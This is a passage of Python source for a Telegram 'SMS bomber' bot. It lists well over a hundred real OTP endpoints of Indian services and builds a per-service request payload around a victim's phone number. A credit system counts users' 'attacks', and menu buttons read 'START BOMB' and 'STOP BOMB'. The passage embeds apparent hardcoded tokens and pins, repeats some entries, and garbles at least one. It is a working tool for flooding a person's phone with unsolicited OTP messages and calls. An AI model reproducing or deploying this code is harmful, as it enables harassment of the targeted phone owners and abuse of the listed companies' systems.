    {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Nuvama Wealth", "url": "https://nma.nuvamaweal"headers": {"Content-Type": "application/json"}},
    {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "NewMe", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Univest", "url": "https://api.univest.in/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "CaratLane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "BikeFixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}},
    {"name": "WellAcademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}},
    {"name": "ServeTel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"}},
    {"name": "GoPink Cabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}},
    {"name": "Shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}},
    {"name": "Cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "MyImagineStore", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}},
    {"name": "Otpless", "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "MyHubble Money", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Tata Capital Business", "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "DealShare", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Housing.com", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "PenPencil V3", "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "DeHaat", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "A23 Games", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Spencer's", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "PayMe India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Shopper's Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Hyuga Auth", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "BigCash", "url": "https://www.bigcash.live/sendsms.php", "method": "POST", "headers": {"Referer": "https://www.bigcash.live/games/poker", "Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "Lifestyle Stores", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "WorkIndia", "url": "https://api.workindia.in/api/candidate/profile/login/verify-number/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}},
    {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Wellness Forever", "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Vyapar", "url": "https://vyaparapp.in/api/ftu/v3/send/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Tata Motors", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "MyGov", "url": "https://auth.mygov.in/regapi/register_api_ver1/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "CodFirm", "url": "https://api.codfirm.in/api/customers/login/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "More Retail", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "AstroSage", "url": "https://vartaapi.astrosage.com/sdk/registerAS", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "TooToo", "url": "https://tootoo.in/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "ConfirmTkt", "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Nuvama Wealth", "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Mpokket", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    
    # ============ NEW APIS ADDED FROM apis1.txt ============
    {"name": "Agrevolution OTP", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Breeze Session Start", "url": "https://api.breeze.in/session/start", "method": "POST", "headers": {"Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8"}},
    {"name": "Jockey OTP", "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "PW Live OTP", "url": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0", "method": "POST", "headers": {"content-type": "application/json"}},
    {"name": "Zoho Store OTP", "url": "https://store.zoho.com/api/v1/partner/affiliate/sendotp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "KPN Fresh OTP", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3", "method": "POST", "headers": {"x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "Content-Type": "application/json; charset=UTF-8"}},
    {"name": "Aditya Birla OTP", "url": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "Muthoot Finance OTP", "url": "https://www.muthootfinance.com/smsapi.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "GoPaySense OTP", "url": "https://api.gopaysense.com/users/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "IIFL OTP", "url": "https://www.iifl.com/personal-loans", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "BankOpen OTP", "url": "https://v2-api.bankopen.co/users/register/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Tata Capital Retail OTP", "url": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "TradeIndia OTP", "url": "https://apis.tradeindia.com/app_login_api/login_app", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Khatabook OTP", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Orange Health OTP", "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Jobhai OTP", "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}},
    {"name": "Mconnect OTP", "url": "https://mconnect.isteer.co/mconnect/login", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "AstroSage Varta OTP", "url": "https://varta.astrosage.com/sdk/registerAS", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "Spinny OTP", "url": "https://api.spinny.com/api/c/user/otp-request/v3/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Dream11 OTP", "url": "https://www.dream11.com/auth/passwordless/init", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "CityMall OTP", "url": "https://citymall.live/api/cl-user/auth/get-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Bella Vita OTP", "url": "https://api.codfirm.in/api/customers/login/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Oyo OTP", "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en", "method": "POST", "headers": {"Content-Type": "text/plain;charset=UTF-8"}},
    {"name": "Myma OTP", "url": "https://portal.myma.in/custom-api/auth/generateotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Freedo Rentals OTP", "url": "https://api.freedo.rentals/customer/sendOtpForSignUp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Licious OTP", "url": "https://www.licious.in/api/login/signup", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Cosmofeed OTP", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Bisleri OTP", "url": "https://apis.bisleri.com/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Evital OTP", "url": "https://www.evitalrx.in:4000/v3/login/signup_sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "QuickRide OTP", "url": "https://pwa.getquickride.com/rideMgmt/probableuser/create/new", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "Clovia OTP", "url": "https://www.clovia.com/api/v4/signup/check-existing-user/", "method": "GET", "headers": {}},
    {"name": "Kwikfix OTP", "url": "https://admin.kwikfixauto.in/api/auth/signupotp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Brevistay OTP", "url": "https://www.brevistay.com/cst/app-api/login", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Hourly Rooms OTP", "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Madras Mandi OTP", "url": "https://api.madrasmandi.in/api/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "multipart/form-data"}},
    {"name": "Bharat Loan OTP", "url": "https://www.bharatloan.com/login-sbm", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "Pagarbook OTP", "url": "https://api.pagarbook.com/api/v5/auth/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Vahak OTP", "url": "https://api.vahak.in/v1/u/o_w", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Redcliffe Labs OTP", "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Ixigo OTP", "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "55Club OTP", "url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}},
    {"name": "Zerodha OTP", "url": "https://zerodha.com/account/registration.php", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}},
    {"name": "Testbook OTP", "url": "https://api.testbook.com/api/v2/mobile/signup", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Medibuddy OTP", "url": "https://loginprod.medibuddy.in/unified-login/user/register", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "TradeIndia Reg OTP", "url": "https://api.tradeindia.com/home/registration/", "method": "POST", "headers": {"Content-Type": "multipart/form-data"}},
    {"name": "Beyoung OTP", "url": "https://www.beyoung.in/api/sendOtp.json", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}},
    {"name": "Wrogn OTP", "url": "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Medkart OTP", "url": "https://app.medkart.in/api/v1/auth/requestOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Coverfox OTP", "url": "https://www.coverfox.com/otp/send/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "Wooden Street OTP", "url": "https://www.woodenstreet.com/index.php?route=account/forgotten_popup", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "GoMechanic OTP", "url": "https://gomechanic.app/api/v2/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Lovelocal OTP", "url": "https://homedeliverybackend.mpaani.com/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Tyreplex OTP", "url": "https://www.tyreplex.com/includes/ajax/gfend.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "Udaan OTP", "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "Xylem OTP", "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "NoBroker V1 OTP", "url": "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "Vidyakul OTP", "url": "https://vidyakul.com/signup-otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "WoodenStreet Register", "url": "https://api.woodenstreet.com/api/v1/register", "method": "POST", "headers": {"Content-Type": "application/json"}},
]

print(f"LOADED {len(APIS)} APIS")

# ============ PAYLOAD GENERATOR (UPDATED FOR NEW APIS) ============
def make_data(phone, api_name):
    name_lower = api_name.lower()
    
    # Voice call specific
    if "voice" in name_lower or "call" in name_lower:
        if "tata" in name_lower:
            return f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
        elif "1mg" in name_lower:
            return f'{{"number":"{phone}","otp_on_call":true}}'
        elif "swiggy" in name_lower:
            return f'{{"mobile":"{phone}"}}'
        elif "flipkart" in name_lower:
            return f'{{"mobile":"{phone}"}}'
        elif "amazon" in name_lower:
            return f"phone={phone}&action=voice_otp"
        elif "paytm" in name_lower:
            return f'{{"phone":"{phone}"}}'
        elif "uber" in name_lower:
            return f'{{"phone":"+91{phone}"}}'
        else:
            return f'{{"mobile":"{phone}"}}'
    
    # WhatsApp specific
    if "whatsapp" in name_lower:
        if "kpn" in name_lower:
            return f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
        elif "eka" in name_lower:
            return f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
        elif "foxy" in name_lower:
            return f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'
        else:
            return f'{{"mobile":"{phone}","channel":"whatsapp"}}'
    
    # New API specific payloads (by name)
    if api_name == "Agrevolution OTP":
        return f'{{"mobile_number":"{phone}","client_id":"kisan-app"}}'
    elif api_name == "Breeze Session Start":
        return f'{{"phoneNumber":"{phone}","authVerificationType":"otp","device":{{"id":"A1pKVEDhlv66KLtoYsml3","platform":"Chrome","type":"Desktop"}},"countryCode":"+91"}}'
    elif api_name == "Jockey OTP":
        return f'{{"mobile":"+91{phone}","whatsapp":true}}'
    elif api_name == "PW Live OTP":
        return f'{{"mobile":"{phone}","countryCode":"+91","subOrgId":"SUB-PWLI000"}}'
    elif api_name == "Zoho Store OTP":
        return f"mobilenumber=91{phone}&countrycode=IN&country=india"
    elif api_name == "KPN Fresh OTP":
        return f'{{"phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    elif api_name == "Aditya Birla OTP":
        return f"MobileNumber={phone}&functionality=signup"
    elif api_name == "Muthoot Finance OTP":
        return f"mobile={phone}&pin=XjtYYEdhP0haXjo3"
    elif api_name == "GoPaySense OTP":
        return f'{{"phone":"{phone}"}}'
    elif api_name == "IIFL OTP":
        return f"apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1&form_build_id=form-FvvMqggkrdM-07pMIIyAElAcaj_kGjCMOS5UHKh_vUc&form_id=webform_submission_muti_step_lead_gen_form_node_66_add_form&_triggering_element_name=op&_triggering_element_value=Apply+Now&_drupal_ajax=1"
    elif api_name == "BankOpen OTP":
        return f'{{"username":"{phone}","is_open_capital":1}}'
    elif api_name == "Tata Capital Retail OTP":
        return f'{{"header":{{"authToken":"MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==","identifier":"nli"}},"body":{{"mobileNumber":"{phone}"}}}}'
    elif api_name == "TradeIndia OTP":
        return f'{{"mobile":"+91{phone}"}}'
    elif api_name == "Khatabook OTP":
        return f'{{"phone":"{phone}","country_code":"+91","app_signature":"wk+avHrHZf2"}}'
    elif api_name == "Orange Health OTP":
        return f'{{"mobile_number":"{phone}","customer_auto_fetch_message":true}}'
    elif api_name == "Jobhai OTP":
        return f'{{"phone":"{phone}"}}'
    elif api_name == "Mconnect OTP":
        return f'{{"mobile_number":"+91{phone}"}}'
    elif api_name == "AstroSage Varta OTP":
        return f"operation_name=signup&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0"
    elif api_name == "Spinny OTP":
        return f'{{"contact_number":"{phone}","whatsapp":false,"code_len":4,"expected_action":"login"}}'
    elif api_name == "Dream11 OTP":
        return f'{{"channel":"sms","flow":"SIGNUP","phoneNumber":"{phone}","templateName":"default"}}'
    elif api_name == "CityMall OTP":
        return f'{{"phone_number":"{phone}"}}'
    elif api_name == "Bella Vita OTP":
        return f'{{"medium":"sms","phoneNumber":"%2B91{phone}","storeUrl":"bellavita1.myshopify.com"}}'
    elif api_name == "Oyo OTP":
        return f'{{"phone":"{phone}","country_code":"+91","nod":4}}'
    elif api_name == "Myma OTP":
        return f'{{"countrycode":"+91","mobile":"91{phone}","is_otpgenerated":false,"app_version":"-1"}}'
    elif api_name == "Freedo Rentals OTP":
        return f'{{"email_id":"test@example.com","first_name":"User","mobile_number":"{phone}"}}'
    elif api_name == "Licious OTP":
        return f'{{"phone":"{phone}","captcha_token":null}}'
    elif api_name == "Cosmofeed OTP":
        return f'{{"phoneNumber":"{phone}","countryCode":"+91","data":{{"email":"test@example.com"}},"authScreen":"signup-screen","userIsConvertingToCreator":false}}'
    elif api_name == "Bisleri OTP":
        return f'{{"email":"test@example.com","mobile":"{phone}"}}'
    elif api_name == "Evital OTP":
        return f'{{"pharmacy_name":"TestPharm","mobile":"{phone}","referral_code":"","email_id":"test@example.com","zip_code":"110086","device_id":"test123","app_version":"desktop","device_name":"Chrome"}}'
    elif api_name == "QuickRide OTP":
        return f"contactNo={phone}&countryCode=%2B91&appName=Quick%20Ride"
    elif api_name == "Clovia OTP":
        return ""  # GET request, no body
    elif api_name == "Kwikfix OTP":
        return f'{{"phone":"{phone}"}}'
    elif api_name == "Brevistay OTP":
        return f'{{"is_otp":1,"is_password":0,"mobile":"{phone}"}}'
    elif api_name == "Hourly Rooms OTP":
        return f'{{"phone":"{phone}"}}'
    elif api_name == "Madras Mandi OTP":
        return f'------WebKitFormBoundary\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+91{phone}\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name="scope"\r\n\r\nclient\r\n------WebKitFormBoundary--\r\n'
    elif api_name == "Bharat Loan OTP":
        return f"mobile={phone}&current_page=login&is_existing_customer=2"
    elif api_name == "Pagarbook OTP":
        return f'{{"phone":"{phone}","language":1}}'
    elif api_name == "Vahak OTP":
        return f'{{"phone_number":"{phone}","scope":0,"is_whatsapp":false}}'
    elif api_name == "Redcliffe Labs OTP":
        return f'{{"phone_number":"{phone}","short":true}}'
    elif api_name == "Ixigo OTP":
        return f"sixDigitOTP=true&resendOnCall=false&prefix=%2B91&resendOnWhatsapp=false&phone={phone}"
    elif api_name == "55Club OTP":
        return f'{{"phone":"91{phone}","codeType":1,"language":0}}'
    elif api_name == "Zerodha OTP":
        return f'{{"mobile":"{phone}","source":"zerodha","partner_id":""}}'
    elif api_name == "Testbook OTP":
        return f'{{"mobile":"{phone}","firstVisitSource":{{"type":"organic","utm_source":"google","utm_medium":"organic"}},"signupSource":{{"type":"organic","utm_source":"google","utm_medium":"organic"}},"signupDetails":{{"page":"HomePage","pagePath":"/","pageType":"HomePage"}}}}'
    elif api_name == "Medibuddy OTP":
        return f'{{"source":"medibuddyInWeb","platform":"medibuddy","phonenumber":"{phone}","flow":"Retail-Login-Home-Flow","idealLoginFlow":false}}'
    elif api_name == "TradeIndia Reg OTP":
        return f'------WebKitFormBoundary\r\nContent-Disposition: form-data; name="country_code"\r\n\r\n+91\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{phone}\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name="whatsapp_update"\r\n\r\ntrue\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name="name"\r\n\r\nTestUser\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name="email"\r\n\r\ntest@example.com\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name="terms"\r\n\r\ntrue\r\n------WebKitFormBoundary--\r\n'
    elif api_name == "Beyoung OTP":
        return f'{{"username":"{phone}","username_type":"mobile","service_type":0}}'
    elif api_name == "Wrogn OTP":
        return f'{{"username":"+91{phone}","type":"mobile","domain":"wrogn.com","recaptcha_token":""}}'
    elif api_name == "Medkart OTP":
        return f'{{"mobile_no":"{phone}"}}'
    elif api_name == "Coverfox OTP":
        return f"contact={phone}"
    elif api_name == "Wooden Street OTP":
        return f"telephone={phone}&firstname=Test&pincode=110086&email=test@example.com&password=Test@123&pagesource=onload&login=2&userput_otp="
    elif api_name == "GoMechanic OTP":
        return f'{{"number":"{phone}","source":"website","random_id":"K6z9b"}}'
    elif api_name == "Lovelocal OTP":
        return f'{{"phone_number":"{phone}","role":"CUSTOMER"}}'
    elif api_name == "Tyreplex OTP":
        return f"perform_action=sendOTP&mobile_no={phone}&action_type=order_login"
    elif api_name == "Udaan OTP":
        return f"mobile={phone}"
    elif api_name == "Xylem OTP":
        return f'{{"mobile":"{phone}","countryCode":"+91","firstName":"TestUser"}}'
    elif api_name == "NoBroker V1 OTP":
        return f"phone=%2B91{phone}"
    elif api_name == "Vidyakul OTP":
        return f"phone={phone}"
    elif api_name == "WoodenStreet Register":
        return f'{{"firstname":"Test","email":"test@example.com","telephone":"{phone}","password":"Test@123","isGuest":0,"pincode":"110001"}}'
    
    # Default fallback for any unmatched API
    return f'{{"mobile":"{phone}"}}'

# ================= DATABASE HANDLING (MONGODB) =================

def get_user(user_id):
    user_id = str(user_id)
    # MongoDB se user find karein
    user = users_col.find_one({"_id": user_id})
    
    if not user:
        # Agar user nahi hai, toh naya create karein (Default Data)
        new_user = {
            "_id": user_id,
            "credits": 50,
            "last_daily": "",
            "total_attacks": 0,
            "username": "",
            "first_name": ""
        }
        users_col.insert_one(new_user)
        return new_user
    return user

def update_credits(user_id, amount):
    user_id = str(user_id)
    # User agar exit nahi karta toh get_user use create kar dega
    get_user(user_id)
    
    # MongoDB me directly value increment ya decrement karein ($inc)
    users_col.update_one(
        {"_id": user_id}, 
        {"$inc": {"credits": amount}}
    )
    
    # Updated credits return karein
    updated_user = users_col.find_one({"_id": user_id})
    return updated_user.get("credits", 0)

# Load_data aur save_data ki ab zaroorat nahi hai 
# Kyunki MongoDB auto-save karta hai aur hum direct collections use karenge.

# ================= UI MENUS (UPDATED) =================
def main_menu():
    kb = telebot.types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        telebot.types.InlineKeyboardButton("⚔️ START BOMB", callback_data="start"),
        telebot.types.InlineKeyboardButton("⏹️ STOP BOMB", callback_data="stop")
    )
    kb.add(
        telebot.types.InlineKeyboardButton("💰 MY CREDITS", callback_data="credits"),
        telebot.types.InlineKeyboardButton("🎁 DAILY BONUS", callback_data="daily")
    )
    kb.add(
        telebot.types.InlineKeyboardButton("🎟️ REDEEM CODE", callback_data="redeem_menu"),
        telebot.types.InlineKeyboardButton("📊 MY STATS", callback_data="mystats")
    )
    kb.add(
        telebot.types.InlineKeyboardButton("❓ HELP", callback_data="help"),
        telebot.types.InlineKeyboardButton("👤 MY ID", callback_data="myid")
    )
    # Channel ka direct link button
    kb.add(
        telebot.types.InlineKeyboardButton("📢 JOIN ", url="https://t.me/fuckerbihario")
    )
    return kb

def admin_menu():
    kb = telebot.types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        telebot.types.InlineKeyboardButton("📊 STATS", callback_data="admin_stats"),
        telebot.types.InlineKeyboardButton("👥 USERS LIST", callback_data="users_list")
    )
    kb.add(
        telebot.types.InlineKeyboardButton("🎟️ GEN CODE", callback_data="gen_code"),
